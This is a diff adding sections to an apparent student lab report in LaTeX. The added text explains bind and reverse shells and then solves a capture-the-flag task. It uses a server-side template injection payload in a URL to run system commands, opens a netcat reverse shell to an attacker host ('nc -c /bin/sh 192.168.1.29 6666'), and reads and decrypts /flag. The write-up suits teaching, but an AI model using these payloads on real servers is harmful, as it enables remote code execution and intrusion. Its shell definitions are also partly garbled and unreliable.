@@ -251,7 +251,39 @@
 	
 	The result was {\sf www-data}, meaning we have compromise the user 'www-data'.
 	
-	\paragraph*{5.}{\bf Can you get a shell? If yes, pwn that server. What is the difference between bind and reverse shells?}
+	\paragraph*{5.}{\bf Can you get a shell? If yes, pwn that server. What is the difference between bind and reverse shells?}\\
 	
+	Bind Shell\\
+	When a user uses BASH and binds a shell to one of it's local port, so that someone can execute commands to on the local network, is called Bind shell.\\
+	
+	Reverse Shell\\
+	A reverse shell works by the remote computer sending its shell to a specific user, rather than binding it to a port, which would be unreachable in many circumstances. This allows root commands over the remote server.\\
+	
+	We can get a reverse Shell using netcat, since we are able to execute commands on victim's machine.\\
+	
+	On the attacker side:\\
+	{\sf nc -lpv 6666}\\
+	
+	After that we run a nc command on victim's side using our exploit.:\\
+	{\sf http://192.168.1.102/index.php?hname=\{\{\_self.env.registerUndefinedFilterCallback(''system'')\}\} \{\{\_self.env.getfilter(''nc -c /bin/sh 192.168.1.29 6666'')\}\}}\\
+	
+	\paragraph*{6.}{\bf Capture the flag. Use all the information you gathered earlier to extract it. Show your results to your lab instructor.}\\
+	
+	From task 2, we know the location of the flag, which is /flag. We can see it's content using 'cat' command running through url.:\\
+	{\sf http://192.168.1.102/index.php?hname=\{\{\_self.env.registerUndefinedFilterCallback(''system'')\}\} \{\{\_self.env.getfilter(''cat /flag'')\}\}}\\
+	
+	\begin{figure}[H]
+		\includegraphics[width=0.75\textheight]{images/3_5_0.jpg}
+		\caption{Contents of /flag.}
+	\end{figure}
+	
+	The file is encrypted, but we already have the key and initialization vector which were found on '53cr37.txt'. Using 'openssl' command with key and iv, we can decrypt the content.\\
+	The url with the command:\\
+	{\sf http://192.168.1.102/index.php?hname=\{\{\_self.env.registerUndefinedFilterCallback(''system'')\}\} \{\{\_self.env.getfilter(''openssl aes-256-cbc -d -a -iv ff52cb37f3818b7f4e175cf222d7f6 -K moon123 -in /flag'')\}\}}\\
+	
+	\begin{figure}[H]
+		\includegraphics[width=0.75\textheight]{images/3_5_1.jpg}
+		\caption{Decrypted flag.}
+	\end{figure}
 \end{document}
 
